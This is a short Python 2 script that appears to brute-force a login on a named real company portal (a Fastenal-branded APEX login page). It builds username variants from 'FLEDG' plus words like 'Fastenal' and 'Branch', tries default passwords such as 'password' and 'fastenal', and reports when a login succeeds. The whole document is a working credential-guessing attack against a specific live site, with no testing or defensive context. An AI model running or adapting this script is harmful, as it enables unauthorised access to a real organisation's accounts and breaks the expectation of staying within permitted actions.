import requests
from collections import OrderedDict
import BeautifulSoup
import itertools
import sys

passwords = ['password', 'fastenal']
fiver = ['FLEDG']
filler = ['Fastenal', 'Fast', 'Branch', 'Store']

def combo(list1, list2):
    return map(''.join, itertools.chain(itertools.product(list1, list2), itertools.product(list2, list1))) 

usernames = list(itertools.chain(combo(fiver, filler),
                                combo(fiver, [x.lower() for x in filler]),
                                combo(fiver, [x.upper() for x in filler]),
                                combo([x.lower() for x in fiver], [x.lower() for x in filler]),
                                combo([x.lower() for x in fiver], [x.upper() for x in filler])))

for u in usernames:
    for p in passwords:
        print u, p
        login = OrderedDict((('user.login_id', u), ('user.password', p)))
        s = requests.Session()
        request = s.post('https://fastsolutions.mroadmin.com/APEX-Login/account_login.action', data=login)
        soup = BeautifulSoup.BeautifulSoup(request.content)
        if not soup.find('font', {'color': 'red'}):
            print 'LOGIN FOUND!'
            sys.exit()
